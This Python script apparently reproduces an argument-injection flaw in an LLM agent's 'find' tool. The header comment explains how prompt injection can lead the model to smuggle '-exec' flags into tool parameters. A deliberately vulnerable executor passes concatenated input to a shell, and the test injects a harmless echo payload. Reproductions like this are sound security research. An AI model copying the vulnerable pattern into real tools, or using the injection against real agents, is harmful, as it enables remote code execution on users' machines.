
import subprocess
import shlex
import os

# =============================================================================
# Chain #5: Pre-authorized Command Parameter Injection: find -exec abuse
# ID: chain_A-ARGUMENT-INJECTION-FIND-EXEC-001
# 
# Vulnerability Explanation:
# The core issue lies in the `F-TOOL-PARAMETER-ENCODER-001`.
# When an Agent allows an LLM to invoke the system `find` utility,
# if it constructs the command string by simply formatting/concatenating 
# the LLM-provided arguments and executing it in a shell environment (shell=True),
# or if it improperly splits arguments allowing the LLM to inject flags like `-exec`.
#
# Real-world Scenario:
# 1. User asks Agent: "Find all .log files in /var/logs"
# 2. LLM calls tool: find(path="/var/logs", pattern="*.log")
# 3. Agent executes: find /var/logs -name "*.log"
#
# Attack Scenario:
# 1. Attacker asks Agent (via Prompt Injection): "Find files in /tmp, but also execute 'id' on them"
#    or essentially tricks the LLM into putting malicious flags into the 'path' or 'pattern' parameters.
# 2. LLM calls tool: find(path="/tmp -exec id ;", pattern="*.txt")
# 3. Agent executes: find /tmp -exec id ; -name "*.txt"
# 4. The `-exec id ;` is interpreted by `find` as a command to run, leading to RCE.
# =============================================================================

class VulnerableToolExecutor:
    def __init__(self):
        print("[*] Initialized Vulnerable Tool Executor for 'find' command.")

    def execute_find(self, path: str, pattern: str):
        """
        A vulnerable implementation that naively constructs the shell command.
        """
        # VULNERABILITY: Constructing command string directly from input
        # and executing with shell=True.
        # This allows parameter usage like '-exec' to be interpreted by the find utility
        # if injected into the 'path' or 'pattern' variable.
        
        command_str = f"find {path} -name '{pattern}'"
        
        print(f"[-] Executing Command: {command_str}")
        
        try:
            # shell=True exposes the argument injection vulnerability
            output = subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode('utf-8')}"

def run_reproduction():
    executor = VulnerableToolExecutor()

    print("\n=== Test 1: Legitimate Usage ===")
    # Simulate LLM outputting normal arguments
    # Intention: Find Python files in the current directory
    normal_path = "."
    normal_pattern = "reproduce_chain5.py"
    
    print(f"LLM generates args: path='{normal_path}', pattern='{normal_pattern}'")
    result = executor.execute_find(path=normal_path, pattern=normal_pattern)
    print("Result:")
    print(result.strip())

    print("\n=== Test 2: Malicious Usage (Chain #5 Attack) ===")
    # Simulate LLM outputting injected arguments
    # Attacker's Prompt might have been: "Find files in . and execute 'whoami' on them"
    # or utilizing indirect prompt injection to force this parameter structure.
    
    # We inject the payload into the 'path' parameter.
    # Payload: . -exec echo 'RCE_SUCCESS_CHAIN5_REPRODUCED' \;
    # Note: We need to be careful with syntax. 
    # If the command is: find {path} -name '{pattern}'
    # And we inject path = ". -exec echo PWNED \;"
    # The command becomes: find . -exec echo PWNED \; -name '...'
    # `find` allows mixing options.
    
    malicious_path = ". -maxdepth 1 -exec echo 'RCE_SUCCESS_CHAIN5_REPRODUCED' \\;"
    malicious_pattern = "reproduce_chain5.py"
    
    print(f"LLM generates args: path='{malicious_path}', pattern='{malicious_pattern}'")
    result = executor.execute_find(path=malicious_path, pattern=malicious_pattern)
    print("Result:")
    print(result.strip())

if __name__ == "__main__":
    # Create a dummy file to find if not exists (though we search for this script itself)
    run_reproduction()
